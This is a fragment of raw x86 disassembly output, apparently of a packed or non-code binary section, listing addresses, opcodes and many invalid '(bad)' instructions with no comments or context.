  417e43:	retf   0x5588
  417e46:	or     ecx,DWORD PTR [ebp+0x7233114d]
  417e4c:	add    eax,DWORD PTR [eax]
  417e4e:	in     al,0x4d
  417e50:	push   ebp
  417e51:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  417e57:	fs add ch,cl
  417e5a:	dec    ebp
  417e5b:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  417e61:	dec    ebp
  417e62:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  417e68:	jge    0x417e38
  417e6a:	mov    BYTE PTR [edi+0xf723b3a],ch
  417e70:	add    cl,dh
  417e72:	dec    ebp
  417e73:	dec    DWORD PTR [ebx-0x2c032375]
  417e79:	adc    BYTE PTR [ebp+0x1],0x8b
  417e7d:	add    al,bl
  417e7f:	jge    0x417e0d
  417e81:	push   0xffffff9c
  417e83:	push   0x8b3032
  417e88:	shl    BYTE PTR [ebp+0x55],0x6a
  417e8c:	xor    edi,edi
  417e8e:	xor    edx,DWORD PTR [ebx+eax*1]
  417e91:	inc    ebp
  417e92:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  417e98:	dec    ebp
  417e99:	or     BYTE PTR [ecx+0x4dc8e483],cl
  417e9f:	jbe    0x417e2c
  417ea1:	mov    ebp,esp
  417ea3:	ror    bl,1
  417ea5:	enter  0x14ce,0xaf
  417ea9:	dec    DWORD PTR [ebx-0x2cef17f8]
  417eaf:	push   ebp
  417eb0:	retf   0x5540
  417eb3:	push   ebp
  417eb4:	mov    esi,DWORD PTR [edx-0x1c]
  417eb7:	mov    edx,ebx
  417eb9:	cld    
  417eba:	(bad)  
  417ebb:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  417ec2:	sti    
  417ec3:	add    dh,cl
  417ec5:	push   0xffffff94
  417ec7:	call   FWORD PTR [eax+edx*8-0x74c4afce]
  417ece:	bswap  esp
  417ed0:	pop    esi
  417ed1:	inc    ebp
  417ed2:	dec    DWORD PTR [ecx+0x45e8c88b]
  417ed8:	push   ebp
  417ed9:	xor    esi,DWORD PTR [ebx]
  417edb:	mov    DWORD PTR [ebx],0xcac00f9c
  417ee1:	aas    
  417ee2:	push   ebp
  417ee3:	inc    ebp
  417ee4:	xor    ecx,eax
  417ee6:	add    ecx,eax
  417ee8:	mov    eax,DWORD PTR [ebx]
  417eea:	(bad)  
  417eeb:	jmp    0x417e79
  417eed:	mov    bl,BYTE PTR [ebp+eax*1-0x2f7674ce]
  417ef4:	les    edi,FWORD PTR [esi-0xeccefb3]
  417efa:	mov    edx,0xff378d80
  417eff:	mov    dh,0xd1
  417f01:	cmp    edx,DWORD PTR [ebp+0xf]
  417f04:	mov    eax,DWORD PTR [edx-0x20]
  417f07:	add    BYTE PTR [ebp-0x75],bh
  417f0a:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  417f11:	pushf  
  417f12:	retf   0x8632
  417f15:	cmp    ebp,0x8
  417f18:	call   ebx
  417f1a:	inc    ebp
  417f1b:	inc    ebp
  417f1c:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  417f22:	mov    esi,DWORD PTR [ecx]
  417f24:	enter  0x49c,0xc7
  417f28:	add    al,al
  417f2a:	add    bl,al
  417f2c:	(bad)  
  417f2d:	clc    
  417f2e:	enter  0x45,0x31
  417f32:	push   eax
  417f33:	pushf  
  417f34:	mov    edi,eax
  417f36:	int3   
  417f37:	or     al,al
  417f39:	test   DWORD PTR [edi],edi
  417f3b:	clc    
  417f3c:	gs inc ebp
  417f3e:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  417f44:	push   ss
  417f45:	xor    ecx,DWORD PTR [ebp+0x3]
  417f48:	sub    edx,DWORD PTR [ecx-0x76]
  417f4b:	dec    ebp
  417f4c:	add    DWORD PTR [ebx+0x88d845],ecx
  417f52:	mov    esi,DWORD PTR [ebx]
  417f54:	or     BYTE PTR [ebx],al
  417f56:	cmp    edx,DWORD PTR [ecx-0x38]
  417f59:	dec    ebp
  417f5a:	out    dx,eax
  417f5b:	xor    eax,DWORD PTR [ebp+0x3]
  417f5e:	mov    edx,DWORD PTR [ecx-0x28]
  417f61:	dec    ebp
  417f62:	add    BYTE PTR [ebx],dh
  417f64:	push   0x518003
  417f69:	push   eax
  417f6a:	add    BYTE PTR [ebx-0x300748b],cl
  417f70:	sbb    BYTE PTR [ebp+0x45],cl
  417f73:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  417f79:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  417f7f:	dec    ebp
  417f80:	inc    ebp
  417f81:	xor    ecx,eax
  417f83:	add    ecx,eax
  417f85:	push   ecx
  417f86:	(bad)  
  417f87:	dec    ebp
  417f88:	mov    al,ds:0xc5e03dff
  417f8d:	retf   
  417f8e:	(bad)  
  417f8f:	into   
  417f90:	sub    bh,bh
  417f92:	dec    esp
  417f93:	adc    al,0x9c
  417f95:	inc    ebp
  417f96:	push   ebp
  417f97:	test   DWORD PTR [edi],ecx
  417f99:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab8ff80]
  417fa0:	jmp    0xc9ba8eb4
  417fa5:	add    cl,dl
  417fa7:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  417fb1:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  417fb7:	rol    BYTE PTR [eax],0x55
  417fba:	clc    
  417fbb:	fs jb  0x417fc5
  417fbe:	mov    eax,DWORD PTR [ebp-0x30]
  417fc1:	xor    al,0x40
  417fc3:	sub    al,0xc7
  417fc5:	mov    ah,ch
  417fc7:	add    DWORD PTR [ebp+0x4534f845],eax
  417fcd:	sub    al,0x86
  417fcf:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  417fd6:	mov    ch,0xff
  417fd8:	clc    
  417fd9:	add    DWORD PTR [ebp+0x60],0x3d
  417fdd:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  417fe4:	inc    ebp
  417fe5:	dec    DWORD PTR [ebx-0x341ff701]
  417feb:	test   esi,ecx
  417fed:	dec    DWORD PTR [ebx-0x7f8a3301]
  417ff3:	push   eax
  417ff4:	add    DWORD PTR [ebp+0x0],eax
  417ff7:	dec    ebx
  417ff9:	or     al,0xce
  417ffb:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  418002:	into   
  418003:	add    BYTE PTR [ebx-0x34ff1400],cl
  418009:	mov    esi,ecx
  41800b:	sar    bh,0x45
  41800e:	adc    al,0x8b
  418010:	clc    
  418011:	fadd   DWORD PTR [ebp+0x0]
  418014:	mov    ebp,DWORD PTR [edx+0x8]
  418017:	push   edi
  418018:	adc    BYTE PTR [eax+0x1],0x83
  41801c:	add    al,al
  41801e:	retf   
  41801f:	mov    ecx,esi
  418021:	cld    
  418022:	mov    eax,DWORD PTR [eax+0xcb01cc]
  418028:	into   
  418029:	add    BYTE PTR [ebx+0x756aec00],cl
  41802f:	jne    0x418064
  418031:	inc    DWORD PTR [ebx]
  418033:	rcl    BYTE PTR [ecx+0x50],1
  418036:	push   eax
  418037:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  41803d:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  418044:	sar    bh,0x84
  418047:	or     BYTE PTR [ebx],al
  418049:	push   eax
  41804a:	add    BYTE PTR [ebx+0x4532c845],cl
  418050:	pushf  
  418051:	xor    edi,eax
  418053:	pushf  
  418054:	mov    ah,0x89
  418056:	test   eax,ebp
  418058:	clc    
  418059:	inc    ebp
  41805a:	inc    ebp
  41805b:	mov    DWORD PTR [eax+eax*8],esi
  41805e:	sub    al,0x30
  418060:	mov    BYTE PTR [ebx+ecx*4+0x55d8ec89],bl
  418067:	dec    ebp
  418068:	xor    eax,DWORD PTR fs:[edi+0x3]
  41806c:	mov    ecx,DWORD PTR [ecx+0x4d55f4b4]
  418072:	xor    eax,DWORD PTR fs:[edi+0x3]
  418076:	or     DWORD PTR [ecx+0x45ff085c],0x0
  41807d:	shl    DWORD PTR [ebp-0x380064],1
  418083:	int3   
  418084:	lea    eax,[ebp+0x45fff860]
  41808a:	push   eax
  41808b:	xor    dh,BYTE PTR [ebp-0x64]
  41808e:	(bad)  
  41808f:	(bad)  
  418090:	pop    esp
  418091:	lods   al,BYTE PTR ds:[esi]
  418092:	inc    DWORD PTR [ebp+0x4508f8ff]
  418098:	mov    edi,DWORD PTR [eax+edx*8]
  41809b:	pushf  
  41809c:	jo     0x418065
  41809e:	cmp    DWORD PTR [eax-0x7a87af0],0x46
  4180a5:	inc    ebp
  4180a6:	add    BYTE PTR [esi],bh
  4180a8:	push   0x8b809c
  4180ad:	in     al,dx
  4180ae:	inc    ebp
  4180af:	push   ebp
  4180b0:	mov    esi,DWORD PTR [ebx]
  4180b2:	cld    
  4180b3:	add    eax,DWORD PTR [eax+0xf013b]
  4180b9:	adc    al,0x0
  4180bb:	add    bh,bh
  4180bd:	jmp    0xbe81da
  4180c2:	add    BYTE PTR [ebp+0x45],cl
  4180c5:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  4180cb:	dec    ebp
  4180cc:	push   0x38033
  4180d1:	cmp    eax,DWORD PTR [eax]
  4180d3:	unpcklps xmm7,xmm0
  4180d6:	jne    0x4180d8
  4180d8:	dec    DWORD PTR [ebx+0x5545cc18]
  4180de:	mov    DWORD PTR [ebx],esi
  4180e0:	shl    BYTE PTR [ebx],1
  4180e2:	inc    ebp
  4180e3:	add    ecx,DWORD PTR [ecx+0x60fc803]
  4180e9:	retf   0x5575
  4180ec:	dec    DWORD PTR [ebx-0x5ba17e8]
  4180f2:	(bad)  
  4180f3:	stc    
  4180f4:	in     al,dx
  4180f5:	or     al,0x85
  4180f7:	dec    ebp
  4180f8:	clc    
  4180f9:	xor    eax,DWORD PTR [ebp+0x3]
  4180fc:	mov    ebp,ecx
  4180fe:	rol    BYTE PTR [eax],1
  418100:	inc    ebp
  418101:	add    BYTE PTR [eax-0x7747ab3],bh
  418107:	clc    
  418108:	inc    ebp
  418109:	retf   
  41810a:	mov    edx,ebx
  41810c:	in     al,dx
  41810d:	(bad)  
  41810e:	retf   
  41810f:	into   
  418110:	into   
  418111:	scas   eax,DWORD PTR es:[edi]
  418112:	dec    ebp
  418113:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  418119:	sub    ecx,esi
  41811b:	cmp    ecx,DWORD PTR [ebp+0x77]
  41811e:	(bad)  
  41811f:	mov    edi,eax
  418121:	int3   
  418122:	test   DWORD PTR [ecx-0x74baff08],ecx
  418128:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  41812f:	xor    eax,DWORD PTR [ebp+0x4503f803]
  418135:	(bad)  
  418137:	retf   0x559c
  41813a:	(bad)  
  41813b:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  418142:	inc    ebp
  418143:	add    eax,0xeb9c4d3f
  418148:	(bad)  
  418149:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  41814f:	xor    ecx,DWORD PTR [ebp+0x33]
  418152:	mov    eax,DWORD PTR [ebx]
  418154:	call   0xce514c5c
  418159:	retf   0x55d1
  41815c:	test   BYTE PTR [ebx-0x5ff17fe],cl
  418162:	jmp    0x41815d
  418164:	add    BYTE PTR ds:0xebf44d8b,al
  41816a:	push   ebp
  41816b:	mov    ebp,DWORD PTR [ebx]
  41816d:	mov    eax,0x33f8558b
  418172:	retf   
  418173:	xor    ecx,esi
  418175:	add    edx,ecx
  418177:	add    eax,DWORD PTR [edx+0xca010f]
  41817d:	push   ebp
  41817e:	dec    ebp
  41817f:	mov    ecx,DWORD PTR [ebx-0x34050718]
  418185:	stc    
  418186:	rol    DWORD PTR ds:0xebce4dd6,cl
  41818c:	scas   eax,DWORD PTR es:[edi]
  41818d:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  418193:	xor    ebp,DWORD PTR [ebx]
  418195:	xor    edi,DWORD PTR [ebx]
  418197:	add    esi,DWORD PTR [edi+0x3]
  41819a:	mov    ecx,DWORD PTR [edi]
  41819c:	clc    
  41819d:	retf   0x55cb
  4181a0:	into   
  4181a1:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  4181a8:	test   al,0x4d
  4181aa:	push   ebp
  4181ab:	jbe    0x4181e0
  4181ad:	mov    esi,DWORD PTR [ebx]
  4181af:	mov    al,0x3
  4181b1:	push   ebp
  4181b2:	add    esi,DWORD PTR [ebx]
  4181b4:	rdpmc  
  4181b6:	retf   0x5503
  4181b9:	add    ecx,DWORD PTR [ebx-0x53517f1]
  4181bf:	dec    ebp
  4181c0:	stc    
  4181c1:	mov    ecx,DWORD PTR [eax]
  4181c3:	or     BYTE PTR [ebp+0x4d],cl
  4181c6:	jmp    0x1358256
  4181cb:	dec    ebp
  4181cc:	dec    ebp
  4181cd:	(bad)  
  4181ce:	mov    ebx,esp
  4181d0:	clc    
  4181d1:	test   ebx,ecx
  4181d3:	clc    
  4181d4:	ror    DWORD PTR [ebp-0x2a],cl
  4181d7:	mov    esi,ecx
  4181d9:	lock scas eax,DWORD PTR es:[edi]
  4181db:	inc    ebp
  4181dc:	mov    esi,DWORD PTR [ebx]
  4181de:	hlt    
  4181df:	pushf  
  4181e0:	jge    0x41816d
  4181e2:	sub    ebx,esp
  4181e4:	cmp    ecx,ebx
  4181e6:	ja     0x4181b6
  4181e8:	mov    ebp,DWORD PTR [eax-0x58]
  4181eb:	dec    ebp
  4181ec:	xor    ecx,DWORD PTR [di+0x3]
  4181f0:	mov    esp,esp
  4181f2:	clc    
  4181f3:	push   ebp
  4181f4:	retf   
  4181f5:	mov    dl,bl
  4181f7:	adc    esi,edx
  4181f9:	jb     0x4181c9
  4181fb:	add    BYTE PTR [edi-0xb7474b3],ch
  418201:	lock jge 0x4181cf
  418204:	sub    ecx,DWORD PTR [ebp+0x3b]
  418207:	mov    esi,DWORD PTR [edi-0x20]
  41820a:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459c]
  418211:	mov    BYTE PTR [ebx-0x34b20729],cl
  418217:	mov    edx,ebx
  418219:	lock (bad) 
  41821b:	ror    esi,cl
  41821d:	push   ebp
  41821e:	scas   eax,DWORD PTR es:[edi]
  41821f:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  418225:	pushf  
  418226:	sub    esi,DWORD PTR [edx]
  418228:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  41822e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41822f:	xor    esp,DWORD PTR [ebx]
  418231:	add    ecx,DWORD PTR [ebp-0x1c]
  418234:	mov    edi,DWORD PTR [ebp-0x8]
  418237:	mov    bl,cl
  418239:	cmp    dl,bl
  41823b:	jb     0x41820b
  41823d:	add    dh,dl
  41823f:	dec    ebp
  418240:	scas   eax,DWORD PTR es:[edi]
  418241:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  418247:	shr    DWORD PTR [ebx],cl
  418249:	into   
  41824a:	cmp    edx,esi
  41824c:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  418252:	dec    ebp
  418253:	dec    ebp
  418254:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  41825a:	retf   
  41825b:	xor    edx,esi
  41825d:	add    ecx,esi
  41825f:	imul   ecx,edx
  418262:	mov    DWORD PTR [ebp+0x8],edx
  418265:	xor    ecx,DWORD PTR [ebp+0x2b]
  418268:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  41826e:	add    esi,DWORD PTR [ebx]
  418270:	rol    BYTE PTR [ebx],0x45
  418273:	rdtsc  
  418275:	xlat   BYTE PTR ds:[ebx]
  418276:	pushf  
  418277:	jge    0x418202
  418279:	xor    esp,eax
  41827b:	sub    eax,DWORD PTR [ebp-0x73]
  41827e:	(bad)  
  41827f:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  418286:	dec    ebp
  418287:	xchg   BYTE PTR [ebx],dh
  418289:	inc    DWORD PTR [ebx]
  41828b:	(bad)  
  41828c:	jmp    0x4182db
  41828e:	mov    ecx,DWORD PTR [ebx-0x34341324]
  418294:	dec    ebp
  418295:	into   
  418296:	mov    ebp,DWORD PTR [edi-0x23737420]
  41829c:	pushf  
  41829d:	shl    DWORD PTR [edx],cl
  41829f:	retf   0x5588
  4182a2:	or     ecx,DWORD PTR [ebp+0x7233114d]
  4182a8:	add    eax,DWORD PTR [eax]
  4182aa:	in     al,0x4d
  4182ac:	push   ebp
  4182ad:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  4182b3:	fs add ch,cl
  4182b6:	dec    ebp
  4182b7:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  4182bd:	dec    ebp
  4182be:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  4182c4:	jge    0x418294
  4182c6:	mov    BYTE PTR [edi+0xf723b3a],ch
  4182cc:	add    cl,dh
  4182ce:	dec    ebp
  4182cf:	dec    DWORD PTR [ebx-0x2c032301]
  4182d5:	inc    ebp
  4182d6:	push   ebp
  4182d7:	dec    DWORD PTR [ebx-0x73ff1f34]
  4182dd:	lea    ebx,[esp+edx*2+0x508bff32]
  4182e4:	mov    ah,0x45
  4182e6:	push   ebp
  4182e7:	mov    esi,DWORD PTR [ebx]
  4182e9:	les    esi,FWORD PTR [ebx]
  4182eb:	add    BYTE PTR [ebx],al
  4182ed:	inc    DWORD PTR [ebx]
  4182ef:	mov    ecx,DWORD PTR [edi]
  4182f1:	cld    
  4182f2:	retf   0x4d80
  4182f5:	add    DWORD PTR [ecx+0x4d30e400],ecx
  4182fb:	jne    0x418288
  4182fd:	(bad)  
  4182fe:	in     al,dx
  4182ff:	ror    bl,1
  418301:	scas   al,BYTE PTR es:[edi]
  418302:	into   
  418303:	add    BYTE PTR [edi-0xf2f7475],ch
  418309:	not    bl
  41830b:	adc    al,0xca
  41830d:	inc    ebp
  41830e:	push   ebp
  41830f:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  418315:	push   0xaf80d6
  41831a:	mov    eax,DWORD PTR [eax]
  41831c:	fdiv   st(7),st
  41831e:	sti    
  41831f:	sbb    dh,cl
  418321:	pop    esi
  418322:	xchg   esp,eax
  418323:	leave  
  418324:	pushf  
  418325:	add    al,0x32
  418327:	push   ebp
  418328:	cmp    ebp,esp
  41832a:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  41832e:	dec    DWORD PTR [ecx-0x740f0375]
  418334:	push   ebp
  418335:	cld    
  418336:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  41833c:	retf   0x558b
  41833f:	clc    
  418340:	xor    esi,eax
  418342:	add    esi,DWORD PTR [ebp-0x75]
  418345:	(bad)  
  418346:	hlt    
  418347:	or     cl,BYTE PTR [esi+eax*8-0x39cdf764]
  41834e:	mov    DWORD PTR [edx],ecx
  418350:	hlt    
  418351:	(bad)  
  418352:	dec    ebp
  418353:	add    dh,BYTE PTR [ebx]
  418355:	leave  
  418356:	mov    edx,0xffec8d55
  41835b:	push   ecx
  41835c:	rol    DWORD PTR [ebp+0x55],1
  41835f:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  418365:	mov    eax,0xf8030b33
  41836a:	lar    ecx,di
  41836d:	push   ebp
  41836e:	retf   0x863b
  418371:	jne    0x418370
  418373:	mov    edi,edi
  418375:	or     BYTE PTR [ebp+0x41],dh
  418378:	mov    ebp,esp
  41837a:	cld    
  41837b:	inc    eax
  41837c:	mov    al,0x25
  41837e:	add    DWORD PTR [ecx+0x0],eax
  418381:	in     eax,dx
  418382:	test   DWORD PTR [ecx-0x1],eax
  418385:	fdiv   st(7),st
  418387:	ret    0x8b
  41838a:	cld    
  41838b:	mov    eax,DWORD PTR [eax+0x8d0151]
  418391:	clc    
  418392:	xor    BYTE PTR [ebp+0x45],al
  418395:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  41839b:	loopne 0x41839c
  41839d:	mov    edi,edi
  41839f:	mov    ecx,eax
  4183a1:	clc    
  4183a2:	jne    0x418374
  4183a4:	call   0x8294ad
  4183a9:	and    eax,0xc6854575
  4183ae:	je     0x4183b1
  4183b0:	mov    eax,esi
  4183b2:	cld    
  4183b3:	or     DWORD PTR [eax+0x401c9],eax
  4183b9:	push   ebp
  4183ba:	add    ah,ch
  4183bc:	add    BYTE PTR [ecx+0x6a],dl
  4183bf:	inc    ebp
  4183c0:	push   esi
  4183c1:	mov    DWORD PTR [eax-0x4],edx
  4183c4:	pop    edi
  4183c5:	mov    ebx,DWORD PTR [ebx-0x4]
  4183c8:	ret    0xbe
  4183cb:	push   es
  4183cc:	mov    ecx,DWORD PTR [ecx-0x77274af]
  4183d2:	clc    
  4183d3:	lock inc ebp
  4183d5:	jne    0x41842d
  4183d7:	(bad)  
  4183d8:	jne    0x4183de
  4183da:	mov    eax,0xf841ba66
  4183df:	fadd   QWORD PTR [esi]
  4183e1:	(bad)  
  4183e2:	jne    0x418421
  4183e4:	cmp    eax,ebx
  4183e6:	pop    esi
  4183e7:	mov    ecx,DWORD PTR [eax]
  4183e9:	push   ecx
  4183ea:	inc    ecx
  4183eb:	lea    esi,[eax-0x8]
  4183ee:	inc    edx
  4183ef:	inc    ebp
  4183f0:	int    0x8b
  4183f2:	inc    edx
  4183f3:	cld    
  4183f4:	jo     0x4183b5
  4183f6:	inc    ecx
  4183f7:	xchg   edx,esp
  4183f9:	mov    ebx,eax
  4183fb:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  418401:	or     edi,eax
  418403:	inc    ebp
  418404:	inc    ebp
  418405:	(bad)  
  418406:	mov    ecx,DWORD PTR [eax]
  418408:	cld    
  418409:	(bad)  
  41840a:	jmp    0x41840d
  41840c:	mov    eax,esi
  41840e:	mov    DWORD PTR ds:0x4f8c98b,eax
  418414:	rcl    BYTE PTR [esi+0xf],1
  418417:	iret   
  418418:	inc    ebp
  418419:	leave  
  41841a:	(bad)  
  41841b:	dec    DWORD PTR [ecx]
  41841d:	mov    eax,esi
  41841f:	mov    eax,DWORD PTR [edi]
  418421:	mov    dh,0xdd
  418424:	push   es
  418425:	nop
  418426:	(bad)  
  418427:	inc    DWORD PTR [ebx]
  418429:	push   esi
  41842a:	leave  
  41842b:	iret   
  41842c:	add    al,0x46
  41842e:	push   ebp
  41842f:	jmp    0xff92da20
  418434:	inc    ebp
  418435:	push   esi
  418436:	mov    DWORD PTR [esi-0x4],eax
  418439:	in     eax,dx
  41843a:	push   ebp
  41843b:	sbb    BYTE PTR [eax+0x7c6daff],bh
  418441:	add    al,BYTE PTR [edx]
  418443:	mov    edx,DWORD PTR [ebp-0x17]
  418446:	cmp    edi,esi
  418448:	jne    0x418449
  41844a:	(bad)  
  41844b:	push   esi
  41844c:	pop    es
  41844d:	push   ebp
  41844e:	mov    ebp,esp
  418450:	or     BYTE PTR [ebp+0x41],al
  418453:	add    edi,esp
  418455:	sub    BYTE PTR [eax-0x4],al
  418458:	int3   
  418459:	jne    0x41841d
  41845b:	add    DWORD PTR [eax],eax
  41845d:	sbb    al,0x8b
  41845f:	mov    edx,DWORD PTR [ecx+0x14]
  418462:	lea    edx,[edx-0x1ba7508]
  418468:	push   esi
  418469:	enter  0xd375,0xb8
  41846d:	test   DWORD PTR [esi],0x6ce0750
  418473:	enter  0xd375,0x3b
  418477:	neg    DWORD PTR [esi+0x50]
  41847a:	or     cl,dl
  41847c:	inc    edx
  41847d:	(bad)  
  41847e:	loope  0x41846c
  418480:	(bad)  
  418481:	sub    eax,DWORD PTR [ebx]
  418483:	inc    eax
  418484:	loope  0x4184d6
  418486:	add    dl,BYTE PTR [eax-0x37]
  418489:	push   edi
  41848a:	push   ebp
  41848b:	imul   ah
  41848d:	adc    DWORD PTR [ecx-0x1],0x45
  418491:	add    BYTE PTR [ecx+0x55d3fc00],cl
  418497:	lea    edi,[eax-0x7fff4ca]
  41849d:	mov    eax,0x4550402
  4184a2:	cmp    ebp,ecx
  4184a4:	jne    0x418451
  4184a6:	mov    eax,DWORD PTR ds:0x241e808
  4184ac:	in     eax,dx
  4184ad:	add    BYTE PTR [eax-0x7],al
  4184b0:	out    0x36,eax
  4184b2:	inc    ecx
  4184b3:	aas    
  4184b4:	jmp    0xcd4736
  4184b9:	lock mov edi,DWORD PTR [ebp-0x18]
  4184bd:	and    edi,edi
  4184bf:	mov    edi,edi
  4184c1:	call   0xe40f859d
  4184c6:	push   es
  4184c7:	add    al,ch
  4184c9:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  4184d0:	(bad)  
  4184d1:	hlt    
  4184d2:	add    eax,0xffd3e87d
  4184d7:	cmp    bh,0x8
  4184da:	(bad)  
  4184db:	fld    DWORD PTR [esi]
  4184dd:	out    dx,al
  4184de:	call   0xffa083e6
  4184e3:	cmp    al,0x46
  4184e5:	shl    edx,0x8
  4184e8:	(bad)  
  4184e9:	pop    es
  4184ea:	fisttp QWORD PTR [ebp+0xe577eff]
  4184f0:	push   ebx
  4184f1:	add    BYTE PTR [ebx+0x24008b56],cl
  4184f7:	add    BYTE PTR [ebp+0x50],al
  4184fa:	push   eax
  4184fb:	add    DWORD PTR [ebx+0x757d1834],ecx
  418501:	sub    edx,DWORD PTR [esi-0x24]
  418504:	jne    0x4184bc
  418506:	lods   eax,DWORD PTR ds:[esi]
  418507:	mov    edx,DWORD PTR [edx-0x34]
  41850a:	dec    esi
  41850b:	out    0x83,eax
  41850d:	into   
  41850e:	push   edi
  418510:	loopne 0x4184e0
  418512:	shr    BYTE PTR [edx+ecx*4+0x0],1
  418516:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  41851d:	rol    DWORD PTR [edx],0x8
  418520:	mov    esp,ecx
  418522:	cmp    DWORD PTR [ebx],0xc
  418525:	mov    esi,0x5001c0
  41852a:	push   eax
  41852b:	push   cs
  41852c:	push   eax
  41852d:	(bad)  
  41852e:	sub    edx,edi
  418530:	push   esi
  418531:	adc    al,0xcb
  418533:	ins    DWORD PTR es:[edi],dx
  418534:	mov    eax,0x203e8
  418539:	add    al,ah
  41853b:	inc    esi
  41853c:	mov    al,ch
  41853e:	pop    es
  41853f:	add    DWORD PTR [eax],0x1
  418542:	add    dh,al
  418544:	add    ah,ch
  418546:	rol    DWORD PTR [edx-0xd],1
  418549:	cli    
  41854a:	push   0x4a
  41854c:	pop    ecx
  41854d:	retf   0xfe6
  418550:	add    BYTE PTR [ebx-0x4e72f41e],al
  418556:	(bad)  
  418557:	dec    BYTE PTR [ebx+0x45b1fc72]
  41855d:	(bad)  
  41855e:	sub    ebp,DWORD PTR [ebx]
  418560:	and    al,0x52
  418562:	(bad)  
  418563:	dec    edi
  418564:	inc    ebp
  418565:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  41856c:	add    BYTE PTR [ebp-0x7b],dh
  41856f:	pop    eax
  418570:	add    BYTE PTR [edx+0x0],bl
  418573:	pop    edx
  418574:	dec    ebp
  418575:	jmp    DWORD PTR [ebx]
  418577:	and    al,0xec
  418579:	push   edx
  41857a:	out    0x64,eax
  41857c:	jmp    0xd3f37b81
  418581:	jmp    0x4185db
  418583:	mov    al,0xfe
  418585:	dec    BYTE PTR [ebp-0x18fd8018]
  41858b:	add    BYTE PTR [esi+ebp*1],bh
  41858e:	pop    edx
  41858f:	icebp  
  418590:	mov    eax,cs
  418592:	ins    BYTE PTR es:[edi],dx
  418593:	adc    eax,0x75510000
  418598:	mov    esi,0x70158
  41859d:	or     DWORD PTR [eax-0x74f48dfe],esi
  4185a3:	mov    edi,esp
  4185a5:	cld    
  4185a6:	jge    0x41861d
  4185a8:	(bad)  
  4185aa:	aas    
  4185ab:	and    al,0x6d
  4185ad:	adc    cl,0x1
  4185b0:	mov    eax,DWORD PTR [eax]
  4185b2:	and    ecx,DWORD PTR [ebx-0x167203fd]
  4185b8:	dec    ebp
  4185b9:	add    eax,ebp
  4185bb:	add    BYTE PTR [edx],al
  4185bd:	fadd   DWORD PTR [eax]
  4185bf:	stc    
  4185c0:	enter  0xee00,0x8b
  4185c4:	sbb    eax,0x1
  4185c7:	sbb    esi,ecx
  4185c9:	in     al,0x0
  4185cb:	in     eax,dx
  4185cc:	add    BYTE PTR [eax],al
  4185ce:	jne    0x41855b
  4185d0:	cmp    edx,esp
  4185d2:	jb     0x4185dd
  4185d4:	jmp    0x41864b
  4185d6:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  4185dc:	add    BYTE PTR [ebx+0x4d83d840],cl
  4185e2:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  4185e8:	jb     0x418573
  4185ea:	pop    edx
  4185eb:	fadd   QWORD PTR [ebx-0x7445faa1]
  4185f1:	or     dh,BYTE PTR [edx+0x0]
  4185f4:	inc    edx
  4185f5:	or     dl,bh
  4185f7:	xlat   BYTE PTR ds:[ebx]
  4185f8:	dec    edx
  4185f9:	push   edi
  4185fa:	add    al,0x7
  4185fc:	leave  
  4185fd:	rol    DWORD PTR [edx+eax*1],0x7
  418601:	add    ecx,ecx
  418603:	mov    edx,ecx
  418605:	int3   
  418606:	jmp    0x4185c6
  418608:	mov    al,0x0
  41860a:	(bad)  
  41860b:	jne    0x4185f5
  41860d:	mov    eax,DWORD PTR [edx]
  41860f:	call   0xc1560314
  418614:	pop    edi
  418615:	add    ebx,DWORD PTR [ecx-0x37]
  418618:	pop    ecx
  418619:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  418620:	push   es
  418621:	mov    eax,DWORD PTR [eax]
  418623:	int3   
  418624:	add    ch,al
  418626:	jae    0x418610
  418628:	int    0x1
  41862a:	enter  0x3000,0x18
  41862e:	add    BYTE PTR [ebp+0x75],al
  418631:	mov    esi,DWORD PTR [eax-0x171f0134]
  418637:	push   0x2
  418639:	pop    ecx
  41863a:	add    BYTE PTR [eax],cl
  41863c:	push   ebx
